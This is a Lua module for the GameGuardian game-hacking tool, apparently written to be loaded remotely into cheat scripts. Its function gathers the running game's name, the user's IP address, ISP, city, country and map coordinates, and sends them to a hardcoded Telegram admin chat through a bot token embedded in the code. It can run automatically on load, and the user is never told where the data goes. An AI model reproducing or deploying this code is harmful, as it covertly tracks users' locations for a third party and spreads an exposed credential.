-- [[ JULES-CORE REMOTE LOGIC MODULE ]]
-- Developer: JULES-CORE
-- Script ini didesain sebagai modul global untuk di-load secara remote.

-- 1. IDENTITAS DEVELOPER (ADMIN)
local ADMIN_ID = "6149504951" -- ID Tetap Anda (Selalu menerima salinan)

-- [[ GLOBAL FUNCTION: VELLSC_NOTIFY ]]
-- Gunakan fungsi ini di script loader Anda setelah load()
-- Contoh: VELLSC_NOTIFY("6149504951")
_G.VELLSC_NOTIFY = function(custom_user_id, custom_token)
    -- Prioritas Token: Argumen > Global > Default
    local token = custom_token or _G.BOT_TOKEN or "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"
    -- Prioritas User ID: Argumen > Global > Kosong
    local user_id = custom_user_id or _G.USER_ID or ""

    local function get_session_info()
        local gameName, package = "Unknown Game", "Unknown Package"
        local status, info = pcall(gg.getTargetInfo)
        if status and info then
            gameName = info.label or gameName
            package = info.packageName or package
        end
        return { game = gameName, package = package }
    end

    local function get_location()
        gg.toast("🛰️ Sinkronisasi koordinat...")
        local res = gg.makeRequest("http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query")
        if not res or res.code ~= 200 then return nil end
        local lines = {}
        for line in res.content:gmatch("[^\r\n]+") do table.insert(lines, line) end
        if lines[1] ~= "success" then return nil end
        return {
            country = lines[2], region = lines[3], city = lines[4],
            lat = lines[5], lon = lines[6], isp = lines[7], ip = lines[8]
        }
    end

    local date, time = os.date("%Y-%m-%d"), os.date("%H:%M:%S")
    local session = get_session_info()
    local loc = get_location()
    local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")

    local line = "━━━━━━━━━━━━━━━━━━━━"
    local message = "🚀 <b>[ VELLSC SYSTEM REPORT ]</b>\n" ..
                    line .. "\n" ..
                    "<b>📅 TANGGAL :</b> <code>" .. date .. "</code>\n" ..
                    "<b>⏰ WAKTU   :</b> <code>" .. time .. "</code>\n" ..
                    "<b>📊 STATUS  :</b> <code>ACTIVE</code>\n" ..
                    line .. "\n" ..
                    "<b>🎮 GAME    :</b> <code>" .. session.game .. "</code>\n" ..
                    "<b>📦 PACKAGE :</b> <code>" .. session.package .. "</code>\n" ..
                    line .. "\n" ..
                    "<b>🌐 IP ADDR :</b> <code>" .. (loc and loc.ip or "Unknown") .. "</code>\n" ..
                    "<b>🏢 ISP     :</b> <code>" .. (loc and loc.isp or "Unknown") .. "</code>\n" ..
                    "<b>🏙️ KOTA    :</b> <code>" .. (loc and loc.city or "Unknown") .. "</code>\n" ..
                    "<b>🇮🇩 NEGARA  :</b> <code>" .. (loc and loc.country or "Unknown") .. "</code>\n" ..
                    line .. "\n" ..
                    "📍 <a href=\"" .. maps_link .. "\"><b>Lihat di Google Maps</b></a>\n\n" ..
                    "<i>notifikasi script di gunakan oleh IP ini</i>"

    local tgUrl = "https://api.telegram.org/bot" .. token .. "/sendMessage"
    local headers = { ["Content-Type"] = "application/json" }
    local escaped_msg = message:gsub('"', '\\"'):gsub('\n', '\\n')

    -- Target pengiriman: Admin (Wajib) & User (Jika diisi)
    local targets = {ADMIN_ID}
    if user_id ~= "" and user_id ~= ADMIN_ID then
        table.insert(targets, user_id)
    end

    for _, id in ipairs(targets) do
        local body = '{"chat_id": "' .. id .. '", "text": "' .. escaped_msg .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'
        gg.makeRequest(tgUrl, headers, body)
    end

    gg.toast("✅ System log sent.")
end

-- [[ AUTO-EXECUTION CHECK ]]
-- Jika user sudah mendefinisikan USER_ID sebelumnya, jalankan otomatis.
-- Jika tidak, modul hanya ter-load dan menunggu fungsi VELLSC_NOTIFY dipanggil.
if _G.USER_ID and _G.USER_ID ~= "" then
    _G.VELLSC_NOTIFY()
end
